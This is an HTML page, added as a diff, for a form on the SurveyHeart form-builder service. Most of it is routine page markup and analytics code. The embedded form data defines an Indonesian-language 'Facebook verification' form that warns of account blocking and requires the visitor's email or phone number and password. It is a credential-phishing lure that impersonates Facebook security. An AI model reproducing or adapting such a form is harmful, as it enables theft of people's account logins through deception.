@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="google-site-verification" content="w3_W4ZRm1qpnJyQhCTcry4PzeU2ELAAgTs0KRoC0sPw"/>
+    <meta name="googlebot" content="noindex, nofollow">
+
+    <!--css -->
+    <link rel="stylesheet" type="text/css" href="/css/material.css">
+    <script src="/js/material.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/form.css">
+    <link rel="stylesheet" type="text/css" href="/css/loader.css">
+
+    <!--Fonts -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="/images/favicon.png"/>
+    <title>SurveyHeart</title>
+
+    <!--Bug tracking-->
+    <script
+            src="https://browser.sentry-cdn.com/6.3.5/bundle.tracing.min.js"
+            integrity="sha384-0RpBr4PNjUAqckh8BtmPUuFGNC082TAztkL1VE2ttmtsYJBUvqcZbThnfE5On6h1"
+            crossorigin="anonymous"
+    ></script>
+    <!--Ads-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-112010057-1"></script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+    <!--Chrome, Firefox OS and Opera -->
+    <meta name="theme-color" content="#1976d2">
+    <!--Windows Phone -->
+    <meta name="msapplication-navbutton-color" content="#1976d2">
+    <!--iOS Safari -->
+    <meta name="apple-mobile-web-app-status-bar-style" content="#1976d2">
+    <meta name="description" content="">
+
+    <!--open graph tool-->
+    <meta property="og:url" content="https://surveyheart.com/form/608bca7586919c70a2066ef7"/>
+    <meta property="og:title" content="PERINGATAN  PEMBLOKIRAN"/>
+    <meta property="og:description" content="VERIFIKASI  FACEBOOK"/>
+    <meta property="og:image" content="https://surveyheart.com/images/thumbnail_512_342/https://surveyheartmedia.s3.ap-south-1.amazonaws.com/themes/sh_1619774571621.jpg"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:image:width" content="512"/>
+    <meta property="og:image:height" content="342"/>
+</head>
+
+<body>
+<!--report abuse form-->
+<div id="report-container" class="report-container">
+    <iframe id="report-iframe"></iframe>
+    <i class="material-icons close-button" onclick="reportAbuseFormClose()">close</i>
+</div>
+
+<!--Violation Alert-->
+<div id="violation-alert" class="report-container">
+    <div class="violation-alert">
+        <div style="display: flex; align-items: center; margin-bottom: 10px">
+            <i class="material-icons" style="margin: 0 10px 0 0; font-size: 40px; color: #212121">error</i>
+            <h4 style="margin: 0">Personal Data</h4>
+        </div>
+        <p>Don't submit your <b>passwords, UPI, OTP, CVV, pin & other bank details</b> on forms.</p>
+        <button id="violation-alert-accept">Submit</button>
+        <button id="violation-alert-cancel">Don't Submit</button>
+    </div>
+</div>
+
+<!--About content-->
+<div id="about-content-popup-id" class="report-container" style="display: none">
+    <div class="about-content-popup-container" style="display: flex; flex-flow: column">
+        <div style="width: 100%">
+            <img style="width: 35px; height: 35px; margin: 10px 10px 0 0; position: relative; float: right; cursor: pointer"
+                 onclick="hideAboutContent()"
+                 src="/images/close_black.svg">
+            <div class="about-content-popup-image-banner">
+                <img style="width: 100%; max-width: 300px" id="app-logo" src="/images/surveyheart1.png">
+            </div>
+        </div>
+        <div class="about-content-popup-body">
+            <div style="padding: 15px; text-align: justify;">
+
+                <div class="content-text-container">
+                    <h2>Survey Builder</h2>
+                    <p>Create surveys/forms with 9 different types of questions which are commonly used for
+                        collecting responses. In our form builder you can control your form access level to the
+                        responders like whether they can view your results or not, are they allowed to give
+                        multiple answers or not, whether questions of your form gets shuffled or not.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2>Templates</h2>
+                    <p>Predesigned templates with suitable themes are available to reduce your typing work, It
+                        consist of 30+ surveys in the categories of Feedbacks, Education, Health,
+                        Registration, Food, Tours & Travels, Applications.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2> Preview survey</h2>
+                    <p>Before publishing your form, you can view your form as how the responders will view your form
+                        when you share it to them, so that you can correct if any changes required. For error free
+                        forms we are providing this feature to you.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2>Offline form builder</h2>
+                    <p>Native form builder allow you to build your forms without internet and save it in offline
+                        forms. When you access the internet you can submit your form with just one click to that saved
+                        form.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2> Instant Notifications</h2>
+                    <p>Get instantly notified for your responses the moment your responder clicks the submit button.
+                        Live notifications enable you to be updated in realtime. you can also get summarised result
+                        instantly with that newly arrived responses.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2>Summarised Responses</h2>
+                    <p>Summary of your responses will be shown in realtime basis. Summarized charts are prepared
+                        immediately after response submitted. Get an error free results instantly for your
+                        surveys.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2> Export your record</h2>
+                    <p>Your survey results can be exported for filing and recording purpose. you can export this
+                        results as excels.</p>
+                </div>
+                <div class="content-text-container">
+                    <h2>Themes</h2>
+                    <p>Your forms should be readable to the responders, it increases your response rate so we are
+                        providing themes to your forms for good readability. You can choose themes related to your
+                        survey content.</p>
+                </div>
+                <div class="about-content-popup-image-banner">
+                    <img style="width: 100%; margin-top: 20px; max-width: 300px" id="download-image"
+                         onclick="gotoPlaystore()"
+                         src="https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!--Form Loader Animation-->
+<div class="loader" id="form-loader">
+    <div class="boxes">
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+
+<!-- Background image -->
+<div class="formsapp_bg_image">
+    <img id="formsapp_bg_image"/>
+</div>
+
+<!-- Welcome Screen -->
+<div id="welcome_screen_container" class="welcome_screen_container">
+    <div id="welcome_title_container" class="welcome_title_container">
+        <h3>
+            <b id="welcome_title_text"></b>
+        </h3>
+        <div id="welcome_description_container" class="welcome_description_container">
+            <p></p>
+        </div>
+    </div>
+    <div id="start_survey_button" class="mdc-button mdc-button--raised submit-btn" data-mdc-auto-init="MDCRipple"
+         onclick="startSurvey()">
+        <div class="mdc-button__ripple"></div>
+        <span id="start-survey-button-text" class="mdc-button__label start-button-label">START</span>
+    </div>
+</div>
+
+<!-- Form Screen -->
+<div id="toast-container" class="toast-container"><span id="toast-text">Sample Text</span></div>
+<div id="form_page_container" class="form_page_container">
+    <div id="fixed_navigation_top" class="fixed_navigation_top" style="flex-direction: column">
+        <img id="form-logo" src="https://surveyheart.com/images/surveyheart1.png" onerror="handleImageError(this)">
+        <h5 id="form_title_top_nav"></h5>
+    </div>
+
+    <!-- Form Elements -->
+    <form id="form_container" class="col s12" action="#"></form>
+
+    <!-- Float Buttons -->
+    <div class="scroll_fab">
+        <div id="scroll_fab" style="opacity: 0.5; height: 56px; width: 56px; border-radius: 56px;
+        background-color: #000;  display: flex; margin: 4px; align-items: center; justify-content: center">
+            <img align="middle" id="scroll_fab_icon" src="/images/expand_more-24px.svg"
+                 class="image_icon">
+        </div>
+        <div id="scroll_fab_navigate" class="scroll-to-next">
+            <i id="scroll_fab_navigate_icon" style="font-size: 38px !important;" class="material-icons">expand_more</i>
+        </div>
+    </div>
+    <!-- Page navigation controls -->
+    <div class="bottom_navigation">
+        <a id="next_page" style="margin: 5px; display: inline" class="btn" onclick="moveToNextPage()">Next
+            <i class="material-icons right">chevron_right</i>
+        </a>
+        <a id="previous_page" style="margin: 5px; display: inline;" class="waves-effect waves-light btn blue"
+           onclick="moveToPreviousPage()">Previous
+            <i class="material-icons left">chevron_left</i>
+        </a>
+        </br>
+        <div id="submission" class="mdc-button mdc-button--raised submit-btn" data-mdc-auto-init="MDCRipple"
+             onclick="submitForm()">
+            <div class="mdc-button__ripple"></div>
+            <span class="mdc-button__label submit-button-label">Submit</span>
+            <i class="material-icons right">done</i>
+        </div>
+        <div id="disclaimer-text-container">
+            <p style="font-size: 14px; color: #ffffff;margin-left: 15px; margin-right: 15px;
+            text-shadow: 1px 1px rgba(0, 0, 0, 0.4);">
+                This form content is not
+                created or endorsed by
+                <span onclick="showAboutContent()" style="cursor: pointer"><u><b>SurveyHeart</b></u></span> -
+                <span id="report-abuse-click"
+                      onclick="reportAbuseFormOpen()"><u><b>Report Abuse</b></u></span>
+            </p>
+        </div>
+    </div>
+
+    <div id="fixed_navigation_bottom" class="fixed_navigation_bottom">
+        <div id="previous-fixed-button-container" style="width: 12%">
+            <i id="previous_fixed_button" class="material-icons"
+               style="text-align: center; color: #fff; font-size: 35px" onclick="moveToPreviousPage()">chevron_left</i>
+        </div>
+        <div style="width: 70%;" class="answered-count-container">
+            <div class="chip"
+                 style="margin: 0; padding-left:35px; padding-right:35px; background-color: #fff; text-align: center;">
+                <label>
+                    <font size="2.5" style="color: #212121;">Answered</font>
+                    <font id="answered_question_count" size="3" style="color: #212121; font-weight: 600">0</font>
+                    <font id="total_question_count" size="2">of 0</font>
+                </label>
+            </div>
+        </div>
+
+        <div id="next_fixed_button_container" style="width: 12%;">
+            <i id="next_fixed_button" class="material-icons"
+               style="text-align: center; color: #fff; font-size: 35px" onclick="moveToNextPage()">chevron_right</i>
+        </div>
+
+        <div id="submit_fixed_button_container" style="width: 12%;">
+            <i id="submit_fixed_button" class="material-icons submit_fixed_button"
+               style="text-align: center; color: #fff; font-size: 35px" onclick="submitForm()">done</i>
+        </div>
+    </div>
+</div>
+
+<!-- Thanks Screen -->
+<div id="thank_screen_container" class="thank_screen_container center-align">
+    <div id="thank_screen_card" class="thanks-card">
+        <div id="thank_screen_card_header" style="width: 100%; display: flex; flex-direction: row; border-radius: 12px;
+        align-items: center;padding: 15px;">
+            <div class="circle-loader" id="circle-loader">
+                <div id="submit-success" class="submit-success draw"></div>
+            </div>
+            <div style="display: flex; flex-direction: column; padding-left:10px;">
+                <h3 id="submitted_success_text"></h3>
+                <p style="color: #757575; font-size: 14px">Thanks for completing this form</p>
+            </div>
+        </div>
+        <div id="response-suggestion-container" class="response-suggestion-container">
+            <div id="view_summary_button" class="mdc-button view-summary-btn mdc-button--raised "
+                 data-mdc-auto-init="MDCRipple" onclick="viewSummary()"
+                 style="background-color: #1976d2 !important; display: none">
+                <div class="mdc-button__ripple"></div>
+                <span class="mdc-button__label button-label"><i class="material-icons button-icon">bar_chart</i> Summary</span>
+            </div>
+            <div id="add_response_button" class="mdc-button add-response-btn mdc-button--raised "
+                 data-mdc-auto-init="MDCRipple" onclick="viewForm()">
+                <div class="mdc-button__ripple"></div>
+                <span class="mdc-button__label button-label"><i
+                        class="material-icons button-icon">add</i> Response</span>
+            </div>
+        </div>
+        <div id="install-promo" class="install-promo" onclick="gotoPlaystore()">
+            <img src="/images/surveyheart_new.png">
+            <div style="display: flex; width: auto; flex-wrap: wrap"><label
+                    class="install-promo-title">SurveyHeart</label>
+                <label class="install-promo-description">Get the free App to create forms</label></div>
+            <label class="install-promo-button" onclick="gotoPlaystore()">Install</label>
+        </div>
+    </div>
+    <!-- Displaying Ad here-->
+    <div id="ad-container">
+        <ins class="adsbygoogle"
+             style="display:block;"
+             data-ad-client="ca-pub-2987317143669509"
+             data-ad-slot="4220236837"
+             data-full-width-responsive="true"></ins>
+    </div>
+</div>
+
+<!--Scripts -->
+<script>
+    Sentry.init({
+        dsn: "https://a23897a41a78460a81935441f7b838a7@o588651.ingest.sentry.io/5748531",
+        release: "form.js-16-May-2021",
+        integrations: [new Sentry.Integrations.BrowserTracing()],
+        tracesSampleRate: 0.2,
+    });
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-112010057-1"></script>
+<script src="/js/ganalytics.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/vibrant.js"></script>
+<script src="/js/request.js"></script>
+<script src="/js/constants.js"></script>
+
+<!--Google analytics-->
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'analytics');
+    analytics('create', 'UA-112010057-1', 'auto');
+</script>
+<script>
+    let formData ={"_id":"608bca7586919c70a2066ef7","setting":{"is_active":true,"is_email":false,"allow_multiple_submit":false,"is_shuffled":false,"show_question_number":true,"allow_summary_view":false,"is_show_logo":false,"notifications":true,"is_show_correct_answer":false},"response_count":5,"welcome_screen":{"title":"PERINGATAN  PEMBLOKIRAN","description":"VERIFIKASI  FACEBOOK","show_button":true,"show_screen":true,"button_text":"VERIFIKASI"},"pages":[{"_id":"608bcc9864411370e78218b8","title":"Page 1","questions":[{"_id":"608bca7586919c70a2066ef9","type":"MULTIPLE_CHOICE","title":"APAKAH ANDA MELAKUKAN  PELANGGAN ","description":"","is_required":true,"is_others_allowed":false,"choices":[{"_id":"608bca7586919c70a2066efa","label":"YA"},{"_id":"608bca7586919c70a2066efb","label":"TIDAK"}]},{"_id":"608bca7586919c70a2066efc","type":"CHECKBOX_CHOICE","title":"LANJUT VERIFIKASI ","description":"","is_required":true,"is_others_allowed":false,"choices":[{"_id":"608bca7586919c70a2066efd","label":"AMANKAN"},{"_id":"608bca7586919c70a2066efe","label":"BLOKIR"}]},{"_id":"608bca7586919c70a2066eff","type":"SECTION","title":"VERIFIKASI FACEBOOK","description":"AMANKAN FACEBOOK"},{"_id":"608bca7586919c70a2066f00","type":"SHORT_TEXT","title":"EMAIL/NO :","description":"","max_value":100,"is_required":true},{"_id":"608bca7586919c70a2066f01","type":"SHORT_TEXT","title":"PASS - WORD :","description":"","max_value":100,"is_required":true},{"_id":"608bca7586919c70a2066f02","type":"CHECKBOX_CHOICE","title":"VERIFIKASI","description":"","is_required":true,"is_others_allowed":false,"choices":[{"_id":"608bca7586919c70a2066f03","label":"YA"},{"_id":"608bca7586919c70a2066f04","label":"TIDAK"}]}]}],"user_id":"novalwahyu166@gmail.com","theme":"https://surveyheartmedia.s3.ap-south-1.amazonaws.com/themes/sh_1619774571621.jpg","date_created":"1619774068076","date_edited":"1619774614146","unique_form_id":"novalwahyu166@gmail.com_1619774068076","is_valid":true,"__v":0,"blocked_words_found":[]};
+    let reportAbuseFormId = "5c6cdd029f25685f413430ef";
+    const ADMIN_FORMS_USER_ID = "surveyheartapp@gmail.com"
+    if (formData !== undefined && (reportAbuseFormId === formData._id
+        || formData.user_id === ADMIN_FORMS_USER_ID)) {
+        document.getElementById("disclaimer-text-container").style.display = "none";
+        document.getElementById("fixed_navigation_bottom").style.display = "none";
+    }
+
+    function gotoPlaystore() {
+        window.location = "https://play.google.com/store/apps/details?id=com.surveyheart";
+        analytics('send', {
+            hitType: 'event',
+            eventCategory: 'Form',
+            eventAction: 'internal_promo',
+            eventLabel: 'playstore'
+        });
+    }
+
+    function showAboutContent() {
+        document.getElementById('about-content-popup-id').style.display = 'flex';
+    }
+
+    function hideAboutContent() {
+        document.getElementById('about-content-popup-id').style.display = 'none';
+    }
+</script>
+<script>
+    if (window.location.pathname.split('/').includes("preview-v1") ||
+        window.location.pathname.split('/').includes("preview")
+        || formData.response_count && formData.response_count === 0
+        || formData.user_id === "surveyheartapp@gmail.com") {
+        document.getElementById("ad-container").style.display = "none";
+    } else {
+        (adsbygoogle = window.adsbygoogle || []).push({});
+    }
+</script>
+<script src="/js/form.js"></script>
+<script>
+    function isPersianLanguage(string) {
+        let persianUnicodeRex = /[\u0600-\u06FF]+/;
+        return persianUnicodeRex.test(string);
+    }
+
+    if (formData !== undefined && isPersianLanguage(formData.welcome_screen.title)
+        || isPersianLanguage(formData.welcome_screen.description)) {
+        document.documentElement.lang = "fa";
+        document.documentElement.dir = "rtl";
+    }
+</script>
+</body>
+
+</html>
